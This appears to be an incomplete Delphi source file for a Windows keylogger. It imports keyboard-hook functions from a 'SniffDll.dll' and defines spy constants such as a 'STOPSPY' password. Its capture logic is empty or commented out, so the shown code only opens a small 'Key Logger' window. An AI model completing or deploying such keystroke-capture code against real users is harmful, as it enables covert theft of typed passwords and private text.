program KeyLogger;

uses
  Messages, Windows;

//{$R KeyLogger.res}

const
  IconName='MAINICON';
  KeyEvent=WM_USER+1;
  MouseEvent=KeyEvent+1;
  WinTitle='TKeyForm';
  BuffSize=500;
  Password='STOPSPY';
  Starting='START HOOK';
  Continue='CONTINUE SPY';
  Ending='END HOOK';
  DllName='SniffDll.dll';
  WinActTxt='Window Activated - ''';

type
  LongRec = packed record
    Lo, Hi: Word;
end;

var
  Handle, Button, CWnd, LastWnd: HWND;
  WinClass: TWndClass;
  HLib: THandle;
  Time: SystemTime;
  Minute: word;
  Msg: TMsg;
  FileName: string;
  Cr: array[0..1] of char;
  Buffer: array[0..1000] of char;
  SzKeyName, WindowName: array[0..100] of char;
  SnifF: boolean;
  bPassword: string[Length(Password)];
  AfterCrush: boolean=false;

function SetKeyHook: Longint; external DllName name 'SetKeyHook';
function DelKeyHook: Longint; external DllName name 'DelKeyHook';

procedure ShowAsk;
begin
  ShowWindow(handle, SW_SHOW);
end;


function WndProc(hnd, wmsg, wparam, lparam: integer): integer; stdcall;
var
  t: string;
begin
  case wmsg of
    WM_COMMAND:
      begin

      end;
    KeyEvent:
      begin

      end;
    MouseEvent:;
    WM_DESTROY:
      begin
        PostQuitMessage(0);
      end;
    else
      Result:=DefWindowProc(hnd, wmsg, wparam, lparam);
    end;
end;

Procedure CreateMySelf;
var
  T: string;
begin
  with WinClass do
    begin
      lpszClassName:=WinTitle;
      lpfnWndProc:=@WndProc;
      cbClsExtra:=0;
      cbWndExtra:=0;
      hInstance:=hInstance;
      style:=CS_HREDRAW+CS_VREDRAW+CS_DBLCLKS;
      hIcon:=LoadIcon(hInstance, IconName);
      hCursor:=LoadCursor(hInstance, IDC_ARROW);
      hbrBackground:=COLOR_WINDOW;
    end;
  RegisterClass(WinClass);
  Handle:=CreateWindowEx(WS_EX_WINDOWEDGE, WinTitle, 'Key Logger',
          WS_VISIBLE or WS_MINIMIZEBOX or WS_CAPTION or WS_SYSMENU,
          integer(CW_USEDEFAULT), integer(CW_USEDEFAULT),
          170, 63, 0, 0, hInstance, nil);
  //Button:=CreateWindowEx(BS_RIGHTBUTTON, 'BUTTON', 'Hook', (WS_TABSTOP or WS_VISIBLE or WS_CHILD), 5, 5, 96, 25, Handle, 0, hInstance, nil);
  T:='Stop Spy';
  //SendMessage(Button, WM_SETTEXT, 0, integer(T));
end;

begin
  CreateMySelf;
  //RegisterMySelf;
  //Cr:=chr(13)+chr(10);
  // indWindow(WinTitle, nil);
  //Sniff:=false;
  //StartSniff;
  ShowAsk;
  while GetMessage(Msg, 0, 0, 0) do
    begin
      TranslateMessage(Msg);
      DispatchMessage(Msg);
    end;
end.
